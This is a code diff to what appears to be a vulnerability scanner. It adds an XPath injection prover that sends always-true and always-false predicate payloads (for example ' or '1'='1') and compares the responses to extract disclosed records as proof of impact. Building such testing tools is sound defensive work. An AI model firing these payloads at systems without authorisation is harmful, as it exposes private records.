@@ -58,7 +58,7 @@ async def prove_findings_impact(
     client: HttpClient,
     findings: list[Finding],
     *,
-    families: frozenset[str] = frozenset({"sqli", "lfi", "ssti", "cmdi", "code-injection"}),
+    families: frozenset[str] = frozenset({"sqli", "lfi", "ssti", "cmdi", "code-injection", "xpath"}),
 ) -> int:
     """Enrich confirmed findings in place with proof of impact. Returns how many were enriched."""
     provers = {
@@ -67,6 +67,7 @@ async def prove_findings_impact(
         "ssti": _prove_ssti,
         "cmdi": _prove_cmdi,
         "code-injection": _prove_code_injection,
+        "xpath": _prove_xpath,
     }
     proven = 0
     for finding in findings:
@@ -366,6 +367,53 @@ async def _prove_code_injection(client: HttpClient, finding: Finding) -> str | N
             return (
                 f"Ejecución de código arbitrario confirmada vía inyección de código (eval): {label} "
                 f"devolvió «{output}». Un atacante ejecuta código del lado servidor (posible RCE)."
+            )
+    return None
+
+
+# --- XPath injection (CWE-643) → prove record disclosure past the filter ------------------------
+# An injectable XPath predicate lets an attacker read records the filter should hide. Prove it with a
+# boolean differential: an always-FALSE predicate returns no record, an always-TRUE one returns them.
+# The visible text present ONLY in the true response (after stripping our payloads and the constant page
+# chrome shared by both) is the data the injection disclosed. Read-only and bounded; no schema needed.
+# The always-true payload carries a STANDALONE ``or '1'='1'`` term so it wins regardless of any trailing
+# ``and password=…`` the app appends (XPath binds ``and`` tighter than ``or``), then re-opens a quote so the
+# rest of the query stays syntactically valid. The false variant is a pure ``and`` chain that matches nothing.
+_XPATH_PAIRS: list[tuple[str, str]] = [
+    ("' or '1'='1' or '1'='1", "' and '1'='2"),        # value in a single-quoted XPath string
+    ('" or "1"="1" or "1"="1', '" and "1"="2'),        # double-quoted
+    (" or 1=1 or 1=1", " and 1=2 and 1=2"),            # numeric / unquoted context
+]
+
+
+def _visible_phrases(html: str) -> list[str]:
+    """Visible text of a page as a list of cleaned phrases (tags become boundaries). Lets us compare two
+    responses phrase-by-phrase so the shared chrome (menus, layout) cancels and only new data remains."""
+    text = re.sub(r"(?is)<(script|style)\b.*?</\1>", " ", html)
+    text = re.sub(r"<[^>]+>", "\n", text)
+    return [c for line in text.split("\n") if len(c := _clean(line)) >= 4]
+
+
+async def _prove_xpath(client: HttpClient, finding: Finding) -> str | None:
+    point = finding.injection_point
+    if point.location not in _INJECTABLE:
+        return None
+    for true_p, false_p in _XPATH_PAIRS:
+        resp_true = await _send(client, build_mutated_request(point, true_p))
+        resp_false = await _send(client, build_mutated_request(point, false_p))
+        if resp_true is None or resp_false is None or resp_true.status_code >= 500:
+            continue
+        # Strip our own payloads so a reflected input never counts as "disclosed data".
+        t_text = resp_true.text.replace(true_p, "")
+        f_text = resp_false.text.replace(false_p, "")
+        false_phrases = set(_visible_phrases(f_text))
+        disclosed = [p for p in _visible_phrases(t_text) if p not in false_phrases and any(ch.isalnum() for ch in p)]
+        if disclosed:
+            snippet = _clean(" | ".join(dict.fromkeys(disclosed)))  # dedupe, keep order, bound
+            return (
+                f"Lectura de registros confirmada vía XPath injection: un predicado siempre-cierto "
+                f"expuso datos que el filtro debía ocultar. Fragmento (solo lectura, acotado): «{snippet}». "
+                "Demuestra que un atacante puede leer registros arbitrarios del documento XML."
             )
     return None
 
